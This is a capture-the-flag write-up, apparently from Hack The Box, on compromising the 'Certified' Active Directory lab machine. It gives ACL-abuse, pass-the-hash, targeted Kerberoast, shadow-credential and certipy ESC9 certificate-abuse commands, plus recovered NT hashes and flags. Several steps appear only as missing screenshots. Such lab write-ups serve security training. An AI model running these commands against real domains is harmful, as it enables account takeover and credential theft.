

# Given

`Certified` is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the `management_svc` account, ACLs (Access Control Lists) over privileged objects are enumerated leading us to discover that `judith.mader` which has the `write owner` ACL over `management` group, management group has `GenericWrite` over the `management_svc` account where we can finally authenticate to the target using `WinRM` obtaining the user flag. Exploitation of the Active Directory Certificate Service (ADCS) is required to get access to the `Administrator` account by abusing shadow credentials and `ESC9`.

**Active breach creds** - 
Username: judith.mader Password: judith09

## IP

10.10.11.41

# Steps

- Started things off with Rustscan to see how many ports are open. I also ran an nmap scan in the background.
- Services running on host:
	- DNS (53)
	- Kerberos (88)
	- RPC (135) - For remote command execution on another host.

![](Assets/Pasted%20image%2020250707094550.png)

```plaintext unwrap=true title="nxc smb users"
CERTIFIED\Enterprise Read-only Domain Controllers (SidTypeGroup)
CERTIFIED\Administrator (SidTypeUser)
CERTIFIED\Guest (SidTypeUser)
CERTIFIED\krbtgt (SidTypeUser)
CERTIFIED\Domain Admins (SidTypeGroup)
CERTIFIED\Domain Users (SidTypeGroup)
CERTIFIED\Domain Guests (SidTypeGroup)
CERTIFIED\Domain Computers (SidTypeGroup)
CERTIFIED\Domain Controllers (SidTypeGroup)
CERTIFIED\Cert Publishers (SidTypeAlias)
CERTIFIED\Schema Admins (SidTypeGroup)
CERTIFIED\Enterprise Admins (SidTypeGroup)
CERTIFIED\Group Policy Creator Owners (SidTypeGroup)
CERTIFIED\Read-only Domain Controllers (SidTypeGroup)
CERTIFIED\Cloneable Domain Controllers (SidTypeGroup)
CERTIFIED\Protected Users (SidTypeGroup)
CERTIFIED\Key Admins (SidTypeGroup)
CERTIFIED\Enterprise Key Admins (SidTypeGroup)
CERTIFIED\RAS and IAS Servers (SidTypeAlias)
CERTIFIED\Allowed RODC Password Replication Group (SidTypeAlias)
CERTIFIED\Denied RODC Password Replication Group (SidTypeAlias)
CERTIFIED\DC01$ (SidTypeUser)
CERTIFIED\DnsAdmins (SidTypeAlias)
CERTIFIED\DnsUpdateProxy (SidTypeGroup)
CERTIFIED\judith.mader (SidTypeUser)
CERTIFIED\Management (SidTypeGroup)
CERTIFIED\management_svc (SidTypeUser)
CERTIFIED\ca_operator (SidTypeUser)
CERTIFIED\alexander.huges (SidTypeUser)
CERTIFIED\harry.wilson (SidTypeUser)
CERTIFIED\gregory.cameron (SidTypeUser)
```

```bash unwrap title="bloodhound ingestor" 
┌──(root㉿n0m4d)-[/host_data]
└─# nxc ldap --dns-server 10.10.11.41 -u judith.mader -p judith09 --bloodhound --collection All 10.10.11.41
LDAP        10.10.11.41     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.10.11.41     389    DC01             Resolved collection methods: localadmin, group, objectprops, acl, rdp, psremote, trusts, dcom, container, session
LDAP        10.10.11.41     389    DC01             Done in 00M 02S
LDAP        10.10.11.41     389    DC01             Compressing output into /root/.nxc/logs/DC01_10.10.11.41_2025-07-07_022315_bloodhound.zip
```

![](Assets/Pasted%20image%2020250707103240.png)

## Exploiting Permissions

![](Assets/Pasted%20image%2020250707104256.png)

Bloodhound gives us the map of the network, and if we trace the outgoing connections from Judith Mader's account, we get to the end (CA_Operator). So we map the path, and look through the permissions each one has over the next.

Bloodhound provides some help with exploiting each relationship.

![](Assets/Pasted%20image%2020250707112247.png)

![](Assets/Pasted%20image%2020250707113303.png)

![](Assets/Pasted%20image%2020250707114223.png)

![](Assets/Pasted%20image%2020250707114446.png)

![](Assets/Pasted%20image%2020250707114503.png)

### Management Group (WriteOwner)

To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).

```bash
owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
```

**Modifying the rights**

To abuse ownership of a group object, you may grant yourself the `AddMember` permission.

Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'
```

**Adding to the group**

You can now add members to the group.

Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:

```bash
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

It can also be done with pass-the-hash using [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.

```bash
pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
```

	Finally, verify that the user was successfully added to the group:

```bash
net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

**Cleanup**

Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).

```bash
dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'
```

### Management_Svc User (GenericWrite)

**Targeted Kerberoast**

A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).

```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

The recovered hash can be cracked offline using the tool of your choice.

**Shadow Credentials attack**

To abuse this permission, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).

```bash
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```

For other optional parameters, view the pyWhisker documentation.

### CA_Operator (GenericAll)

Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one.

**Targeted Kerberoast**

A targeted kerberoast attack can be performed using targetedKerberoast.py.

```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

The recovered hash can be cracked offline using the tool of your choice.

**Force Change Password**

Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.

```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

It can also be done with pass-the-hash using pth-toolkit's net tool. If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.

```bash
pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
```

Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.

**Shadow Credentials attack**

To abuse this permission, use pyWhisker.

```bash
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```

![](Assets/Pasted%20image%2020250707130639.png)

![](Assets/Pasted%20image%2020250707131414.png)

![](Assets/Pasted%20image%2020250707131832.png)

![](Assets/Pasted%20image%2020250707133334.png)

![](Assets/Pasted%20image%2020250707133740.png)

```bash
┌──(root㉿n0m4d)-[/host_data]
└─# faketime "$(ntpdate -q DC01.certified.htb | cut -d ' ' -f 1,2)" certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@certified.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
┌──(root㉿n0m4d)-[/host_data]
└─# certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

```

![](Assets/Pasted%20image%2020250707134046.png)

```bash
┌──(root㉿n0m4d)-[/host_data]
└─# faketime "$(ntpdate -q DC01.certified.htb | cut -d ' ' -f 1,2)" certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certified.htb'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

```

![](Assets/Pasted%20image%2020250707134217.png)

# Creds

```bash
NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584    
```

```bash
NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

# Flags

user: 1f51c97b100492c4ef8b3d4fc371e658

root: 56b68e4d11339110104af6dcff819495

![](Assets/Pasted%20image%2020250707131011.png)

![](Assets/Pasted%20image%2020250707130931.png)

![](Assets/Pasted%20image%2020250707134455.png)

# Proof